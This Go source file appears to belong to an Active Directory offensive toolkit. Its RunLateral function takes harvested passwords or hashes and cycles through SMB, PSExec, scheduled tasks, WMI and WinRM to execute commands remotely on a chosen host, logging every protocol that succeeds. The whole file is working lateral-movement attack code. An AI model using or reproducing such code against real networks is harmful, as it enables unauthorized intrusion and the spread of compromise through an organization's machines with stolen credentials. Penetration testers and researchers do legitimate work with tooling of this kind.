package modules

import (
	"context"
	"fmt"
	"time"

	"adpack/core"
)

type protocolAction struct {
	Name   string
	Method string
}

func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target available for lateral movement")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No valid credentials for lateral movement")
		result.Success = false
		return result
	}

	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)

	actions := []protocolAction{
		{"SMB", "command"},
		{"PSExec", "command"},
		{"Schtasks", "command"},
		{"WMI", "command"},
		{"WinRM", "command"},
	}

	ctx := context.Background()
	anySuccess := false

	for _, a := range actions {
		fmt.Printf("[*] Trying %s on %s...\n", a.Name, host.IP)
		act := core.Action{
			Target:   core.HostRef{Name: host.IP, Domain: host.Domain},
			Method:   a.Method,
			Artifact: "whoami",
			Timeout:  30 * time.Second,
		}
		res := exec.Execute(ctx, act)
		if res.Success {
			anySuccess = true
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: "lateral_success", Phase: core.PhaseLateral,
				Source: "netexec_" + host.Domain, Key: host.IP,
				Value:     fmt.Sprintf("%s: %s", a.Name, res.Output),
				Timestamp: time.Now(),
			})
			fmt.Printf("  ✓  %s succeeded\n", a.Name)
		}
	}

	if !anySuccess {
		fmt.Printf("  ✗  All protocols failed\n")
		result.Success = false
	}

	return result
}
